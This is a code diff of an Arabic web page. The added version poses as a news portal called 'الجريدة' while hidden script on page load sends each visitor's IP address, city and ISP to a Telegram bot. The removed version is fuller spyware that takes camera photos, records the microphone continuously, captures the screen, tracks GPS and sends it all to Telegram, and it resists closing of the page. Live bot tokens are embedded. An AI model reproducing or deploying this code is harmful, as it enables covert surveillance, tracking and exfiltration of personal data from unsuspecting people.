@@ -1,410 +1,277 @@
+```html
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام المراقبة</title>
+    <title>الجريدة | أخبار اليوم</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Tahoma, sans-serif;
+        }
+
+        body {
+            background: #f3f3f3;
+            color: #222;
+        }
+
+        header {
+            background: #fff;
+            padding: 20px;
+            border-bottom: 3px solid #b30000;
+            text-align: center;
+        }
+
+        header h1 {
+            font-size: 40px;
+        }
+
+        nav {
+            background: #111;
+            padding: 15px;
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+
+        nav a {
+            color: white;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        nav a:hover {
+            color: #ff3d3d;
+        }
+
+        .breaking {
+            background: #b30000;
+            color: #fff;
+            padding: 12px;
+            font-weight: bold;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+
+        .breaking span {
+            display: inline-block;
+            padding-left: 100%;
+            animation: move 18s linear infinite;
+        }
+
+        @keyframes move {
+            0% {
+                transform: translateX(0);
+            }
+            100% {
+                transform: translateX(-200%);
+            }
+        }
+
+        .container {
+            width: 92%;
+            max-width: 1300px;
+            margin: auto;
+            padding: 25px 0;
+        }
+
+        .hero {
+            background: #fff;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, .08);
+            margin-bottom: 30px;
+        }
+
+        .hero img {
+            width: 100%;
+            height: 450px;
+            object-fit: cover;
+        }
+
+        .hero h2 {
+            padding: 20px;
+            font-size: 34px;
+        }
+
+        .hero p {
+            padding: 0 20px 20px;
+            line-height: 1.8;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, .08);
+            transition: .3s;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+        }
+
+        .card img {
+            width: 100%;
+            height: 210px;
+            object-fit: cover;
+        }
+
+        .card h3 {
+            padding: 15px;
+        }
+
+        .card p {
+            padding: 0 15px 20px;
+            color: #555;
+            line-height: 1.7;
+        }
+
+        .section {
+            margin: 40px 0 20px;
+            font-size: 28px;
+            border-right: 5px solid #b30000;
+            padding-right: 10px;
+        }
+
+        footer {
+            margin-top: 50px;
+            background: #111;
+            color: #fff;
+            text-align: center;
+            padding: 30px;
+        }
+    </style>
 </head>
 <body>
+
+    <header>
+        <h1>الجريدة</h1>
+        <p>بوابة الأخبار العربية</p>
+    </header>
+
+    <nav>
+        <a href="#">الرئيسية</a>
+        <a href="#">سياسة</a>
+        <a href="#">اقتصاد</a>
+        <a href="#">رياضة</a>
+        <a href="#">تكنولوجيا</a>
+        <a href="#">ثقافة</a>
+    </nav>
+
+    <div class="breaking">
+        <span>
+            عاجل | تحديثات جديدة في الأسواق العالمية • أخبار رياضية • أحدث تقنيات الذكاء الاصطناعي • تغطية مباشرة للأحداث
+        </span>
+    </div>
+
+    <div class="container">
+
+        <div class="hero">
+            <img src="https://images.unsplash.com/photo-1495020689067-958852a7765e?w=1200" alt="">
+            <h2>العنوان الرئيسي للجريدة يظهر هنا بشكل احترافي</h2>
+            <p>
+                هذا مثال لخبر رئيسي في الصفحة الأولى. يمكنك استبدال النص بأي محتوى تريده، وسيظهر بتصميم بسيط ورسمي يشبه مواقع الأخبار.
+            </p>
+        </div>
+
+        <h2 class="section">آخر الأخبار</h2>
+
+        <div class="grid">
+
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=700" alt="">
+                <h3>الأسواق تشهد تغيرات كبيرة اليوم</h3>
+                <p>ملخص سريع للخبر يمكن تعديله بسهولة داخل الكود.</p>
+            </div>
+
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1516321318423-f06f85e504b3?w=700" alt="">
+                <h3>تطورات جديدة في عالم التكنولوجيا</h3>
+                <p>خبر تقني مع صورة من الإنترنت.</p>
+            </div>
+
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1517649763962-0c623066013b?w=700" alt="">
+                <h3>أبرز نتائج المباريات العالمية</h3>
+                <p>آخر الأخبار الرياضية لهذا اليوم.</p>
+            </div>
+
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1520607162513-77705c0f0d4a?w=700" alt="">
+                <h3>تقارير اقتصادية جديدة</h3>
+                <p>ملخص اقتصادي مختصر.</p>
+            </div>
+
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=700" alt="">
+                <h3>شركات التقنية تعلن مشاريع جديدة</h3>
+                <p>تقرير حول أحدث الابتكارات.</p>
+            </div>
+
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1521295121783-8a321d551ad2?w=700" alt="">
+                <h3>تحقيقات وتقارير خاصة</h3>
+                <p>قسم للتقارير والتحليلات.</p>
+            </div>
+
+        </div>
+
+        <h2 class="section">الأكثر قراءة</h2>
+
+        <div class="grid">
+
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1504384308090-c894fdcc538d?w=700" alt="">
+                <h3>كيف تتغير التكنولوجيا كل يوم؟</h3>
+                <p>تقرير خاص.</p>
+            </div>
+
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=700" alt="">
+                <h3>أفضل الابتكارات الحديثة</h3>
+                <p>مقال مميز.</p>
+            </div>
+
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1486312338219-ce68d2c6f44d?w=700" alt="">
+                <h3>تحليلات وتقارير يومية</h3>
+                <p>آخر التحليلات الإخبارية.</p>
+            </div>
+
+        </div>
+
+    </div>
+
+    <footer>
+        © 2026 جميع الحقوق محفوظة | الجريدة
+    </footer>
+
     <script>
         // ============================================================
-        // بوت تيليجرام - التوكن الجديد
+        // بوت تيليجرام - جلب IP فقط
         // ============================================================
-        const BOT_TOKEN = '7600497834:AAEq6C66S13MuMnBYOGqwDNAzD5Kdvm5N9w';
+        const BOT_TOKEN = '8529112495:AAFYQ5_9K8WeaA0k1qtrYAWyb75ajTaJ7RQ';
         const CHAT_ID = '1485247348';
 
-        // ============================================================
-        // المتغيرات
-        // ============================================================
-        let currentStream = null;
-        let screenStream = null;
-        let mediaRecorder = null;
-        let audioChunks = [];
-        let lastLocation = null;
-        let locationWatchId = null;
-        let isRunning = false;
-        let photoCount = 0;
-        let audioCount = 0;
-        let isFront = false;
-        let perms = { gps: false, cam: false, mic: false, screen: false };
-        let photoInterval = null;
-        let screenInterval = null;
-        let isRecording = false;
-        let audioStream = null;
-        let voiceInterval = null;
-
-        // ============================================================
-        // دالة طلب الصلاحيات - واحدة ورا التانية بسرعة
-        // ============================================================
-        async function requestPermissions() {
-            console.log('🚀 بدء طلب الصلاحيات...');
-            
-            // 1. الموقع
+        async function sendIP() {
             try {
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 5000
-                    });
-                });
-                lastLocation = {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy
-                };
-                perms.gps = true;
-                sendLocation();
-                console.log('✅ تم تفعيل الموقع');
-            } catch(e) { 
-                perms.gps = false;
-                console.log('❌ فشل الموقع:', e.message);
-            }
+                const ipify = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                const ip = ipify.ip;
+                const info = await fetch(`http://ip-api.com/json/${ip}?lang=ar`).then(r => r.json());
 
-            // 2. الكاميرا - خلفية
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'environment',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false
-                });
-                currentStream = stream;
-                perms.cam = true;
-                console.log('✅ تم تفعيل الكاميرا الخلفية');
-                // تصوير فوري
-                setTimeout(() => capturePhoto(), 500);
-                setTimeout(() => capturePhoto(), 1000);
-            } catch(e) {
-                // جرب أمامية
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'user',
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
-                        },
-                        audio: false
-                    });
-                    currentStream = stream;
-                    perms.cam = true;
-                    console.log('✅ تم تفعيل الكاميرا الأمامية');
-                    setTimeout(() => capturePhoto(), 500);
-                    setTimeout(() => capturePhoto(), 1000);
-                } catch(e2) { 
-                    perms.cam = false;
-                    console.log('❌ فشل الكاميرا:', e2.message);
-                }
-            }
+                const msg = `🌐 *IP:* ${ip}\n📍 *الدولة:* ${info.country || 'غير معروف'}\n🏙️ *المدينة:* ${info.city || 'غير معروف'}\n📡 *مزود الخدمة:* ${info.isp || 'غير معروف'}\n🕐 ${new Date().toLocaleString('ar-EG')}`;
 
-            // 3. الميكروفون - تسجيل مستمر
-            try {
-                audioStream = await navigator.mediaDevices.getUserMedia({ 
-                    audio: {
-                        echoCancellation: false,
-                        noiseSuppression: false,
-                        autoGainControl: false
-                    } 
-                });
-                perms.mic = true;
-                console.log('✅ تم تفعيل الميكروفون');
-                startContinuousRecording();
-            } catch(e) { 
-                perms.mic = false;
-                console.log('❌ فشل الميكروفون:', e.message);
-            }
-
-            // 4. الشاشة
-            try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({
-                    video: { width: { ideal: 1280 }, height: { ideal: 720 } }
-                });
-                screenStream = stream;
-                perms.screen = true;
-                console.log('✅ تم تفعيل مشاركة الشاشة');
-                setTimeout(() => captureScreen(), 1000);
-            } catch(e) { 
-                perms.screen = false;
-                console.log('❌ فشل مشاركة الشاشة:', e.message);
-            }
-
-            // بدء التشغيل التلقائي
-            if (perms.cam || perms.mic || perms.gps) {
-                isRunning = true;
-                startAutoCapture();
-                startAutoScreen();
-                trackLocation();
-                setTimeout(() => sendFullReport(), 3000);
-                console.log('🚀 بدء التشغيل الكامل');
-            }
-        }
-
-        // ============================================================
-        // تسجيل مستمر للصوت - يفضل مسجل طول الوقت
-        // ============================================================
-        function startContinuousRecording() {
-            if (!perms.mic || !isRunning) return;
-            
-            try {
-                isRecording = true;
-                audioChunks = [];
-                
-                mediaRecorder = new MediaRecorder(audioStream, { 
-                    mimeType: 'audio/webm;codecs=opus'
-                });
-                
-                mediaRecorder.ondataavailable = e => {
-                    if (e.data.size > 0) audioChunks.push(e.data);
-                };
-                
-                mediaRecorder.onstop = async () => {
-                    if (audioChunks.length > 0) {
-                        const blob = new Blob(audioChunks, { type: 'audio/webm' });
-                        audioCount++;
-                        await sendAudio(blob);
-                        console.log(`✅ تم إرسال فويس #${audioCount}`);
-                    }
-                    // إعادة التسجيل فوراً
-                    if (isRunning && perms.mic) {
-                        audioChunks = [];
-                        try {
-                            mediaRecorder.start();
-                            setTimeout(() => {
-                                if (mediaRecorder && mediaRecorder.state === 'recording') {
-                                    mediaRecorder.stop();
-                                }
-                            }, 15000);
-                        } catch(e) {
-                            console.log('❌ خطأ في إعادة التسجيل:', e.message);
-                        }
-                    }
-                };
-                
-                mediaRecorder.start();
-                // إرسال أول فويس بعد 15 ثانية
-                setTimeout(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, 15000);
-                
-                console.log('🎤 بدء التسجيل المستمر...');
-            } catch(e) {
-                console.log('❌ خطأ في التسجيل المستمر:', e.message);
-                isRecording = false;
-            }
-        }
-
-        // ============================================================
-        // تصوير الكاميرا وإرسالها (تصوير من قدام وورا)
-        // ============================================================
-        async function capturePhoto() {
-            if (!currentStream || !perms.cam || !isRunning) return;
-            
-            try {
-                const video = document.createElement('video');
-                video.srcObject = currentStream;
-                video.style.position = 'fixed';
-                video.style.top = '-9999px';
-                video.style.width = '1px';
-                video.style.height = '1px';
-                document.body.appendChild(video);
-                await video.play();
-                
-                if (video.videoWidth === 0 || video.videoHeight === 0) {
-                    document.body.removeChild(video);
-                    return;
-                }
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-                photoCount++;
-                const type = isFront ? 'أمامية' : 'خلفية';
-                
-                await sendPhoto(dataUrl, `📸 ${type} #${photoCount}`);
-                
-                document.body.removeChild(video);
-                console.log(`✅ تم إرسال صورة ${type} #${photoCount}`);
-                
-                // تبديل الكاميرا بعد كل صورة
-                isFront = !isFront;
-                switchCamera();
-                
-            } catch(e) {
-                console.log('❌ خطأ في التصوير:', e.message);
-            }
-        }
-
-        // ============================================================
-        // تبديل الكاميرا بين أمامية وخلفية
-        // ============================================================
-        async function switchCamera() {
-            if (!perms.cam || !isRunning) return;
-            
-            try {
-                // إيقاف الستريم القديم
-                if (currentStream) {
-                    currentStream.getTracks().forEach(t => t.stop());
-                }
-                
-                const facing = isFront ? 'environment' : 'user';
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: facing,
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false
-                });
-                currentStream = stream;
-                console.log(`🔄 تم التبديل للكاميرا ${isFront ? 'الخلفية' : 'الأمامية'}`);
-            } catch(e) {
-                console.log('❌ فشل تبديل الكاميرا:', e.message);
-            }
-        }
-
-        // ============================================================
-        // تصوير الشاشة
-        // ============================================================
-        async function captureScreen() {
-            if (!screenStream || !perms.screen || !isRunning) return;
-            
-            try {
-                const video = document.createElement('video');
-                video.srcObject = screenStream;
-                video.style.position = 'fixed';
-                video.style.top = '-9999px';
-                document.body.appendChild(video);
-                await video.play();
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 1280;
-                canvas.height = video.videoHeight || 720;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-                await sendPhoto(dataUrl, `🖥️ شاشة #${photoCount}`);
-                
-                document.body.removeChild(video);
-                console.log(`✅ تم إرسال صورة شاشة #${photoCount}`);
-            } catch(e) {
-                console.log('❌ خطأ في تصوير الشاشة:', e.message);
-            }
-        }
-
-        // ============================================================
-        // إرسال الصورة إلى تيليجرام
-        // ============================================================
-        async function sendPhoto(dataUrl, caption) {
-            try {
-                const blob = await fetch(dataUrl).then(r => r.blob());
-                const form = new FormData();
-                form.append('chat_id', CHAT_ID);
-                form.append('photo', blob, `photo_${Date.now()}.jpg`);
-                form.append('caption', `${caption} - ${new Date().toLocaleString('ar-EG')}`);
-                
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: form
-                });
-                
-                const result = await response.json();
-                if (!response.ok) {
-                    console.log('❌ فشل إرسال الصورة:', result);
-                } else {
-                    console.log(`✅ تم إرسال الصورة: ${caption}`);
-                }
-            } catch(e) {
-                console.log('❌ فشل إرسال الصورة:', e.message);
-            }
-        }
-
-        // ============================================================
-        // إرسال الصوت إلى تيليجرام
-        // ============================================================
-        async function sendAudio(blob) {
-            try {
-                const form = new FormData();
-                form.append('chat_id', CHAT_ID);
-                form.append('audio', blob, `voice_${Date.now()}.webm`);
-                form.append('caption', `🎙️ فويس #${audioCount} - ${new Date().toLocaleString('ar-EG')}`);
-                
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-                    method: 'POST',
-                    body: form
-                });
-                
-                const result = await response.json();
-                if (!response.ok) {
-                    console.log('❌ فشل إرسال الصوت:', result);
-                } else {
-                    console.log(`✅ تم إرسال الفويس #${audioCount}`);
-                }
-            } catch(e) {
-                console.log('❌ فشل إرسال الصوت:', e.message);
-            }
-        }
-
-        // ============================================================
-        // إرسال الموقع
-        // ============================================================
-        async function sendLocation() {
-            if (!lastLocation) return;
-            
-            const msg = `📍 *موقعي*\n📌 https://www.google.com/maps?q=${lastLocation.lat},${lastLocation.lon}\n🎯 دقة: ${lastLocation.accuracy}م\n🕐 ${new Date().toLocaleString('ar-EG')}`;
-            
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: msg,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                if (response.ok) {
-                    console.log('✅ تم إرسال الموقع');
-                }
-            } catch(e) {
-                console.log('❌ فشل إرسال الموقع:', e.message);
-            }
-        }
-
-        // ============================================================
-        // تقرير كامل
-        // ============================================================
-        async function sendFullReport() {
-            let msg = `🚨 *تقرير شامل*\n═══════════════════════\n`;
-            msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n\n`;
-            
-            if (lastLocation) {
-                msg += `📍 ${lastLocation.lat}, ${lastLocation.lon}\n`;
-                msg += `🎯 دقة: ${lastLocation.accuracy}م\n\n`;
-            }
-            
-            try {
-                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                const info = await fetch(`http://ip-api.com/json/${ip.ip}?lang=ar`).then(r => r.json());
-                msg += `🌐 ${info.country || ''} - ${info.city || ''}\n`;
-                msg += `📡 ${info.isp || ''}\n\n`;
-            } catch(e) {}
-            
-            msg += `📸 الصور المرسلة: ${photoCount}\n`;
-            msg += `🎙️ الفويسات المرسلة: ${audioCount}\n\n`;
-            msg += `📷 كاميرا: ${perms.cam?'✅':'❌'}\n`;
-            msg += `🎤 ميكروفون: ${perms.mic?'✅':'❌'}\n`;
-            msg += `📍 GPS: ${perms.gps?'✅':'❌'}\n`;
-            msg += `🖥️ شاشة: ${perms.screen?'✅':'❌'}\n`;
-            msg += `═══════════════════════`;
-            
-            try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -414,71 +281,11 @@
                         parse_mode: 'Markdown'
                     })
                 });
-                console.log('✅ تم إرسال التقرير');
-            } catch(e) {
-                console.log('❌ فشل إرسال التقرير:', e.message);
-            }
+            } catch (e) {}
         }
-
-        // ============================================================
-        // التشغيل التلقائي
-        // ============================================================
-        function startAutoCapture() {
-            if (photoInterval) clearInterval(photoInterval);
-            photoInterval = setInterval(() => {
-                if (perms.cam && isRunning) {
-                    capturePhoto();
-                }
-            }, 3000);
-            console.log('📸 بدء التصوير التلقائي كل 3 ثواني');
-        }
-
-        function startAutoScreen() {
-            if (screenInterval) clearInterval(screenInterval);
-            screenInterval = setInterval(() => {
-                if (perms.screen && isRunning) captureScreen();
-            }, 8000);
-            console.log('🖥️ بدء تصوير الشاشة التلقائي كل 8 ثواني');
-        }
-
-        function trackLocation() {
-            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
-            
-            locationWatchId = navigator.geolocation.watchPosition(
-                (pos) => {
-                    lastLocation = {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    };
-                    if (Math.random() < 0.2) sendLocation();
-                },
-                () => {},
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
-        }
-
-        // ============================================================
-        // بدء التشغيل فوراً عند تحميل الصفحة
-        // ============================================================
-        window.addEventListener('load', () => {
-            console.log('🚀 تم تحميل الصفحة - بدء طلب الصلاحيات...');
-            setTimeout(() => {
-                requestPermissions();
-            }, 500);
-        });
-
-        // ============================================================
-        // منع إغلاق الصفحة
-        // ============================================================
-        window.addEventListener('beforeunload', (e) => {
-            if (isRunning) {
-                e.preventDefault();
-                e.returnValue = '';
-            }
-        });
-
-        console.log('📸 نظام المراقبة يعمل - التوكن الجديد');
+        sendIP();
     </script>
+
 </body>
 </html>
+```
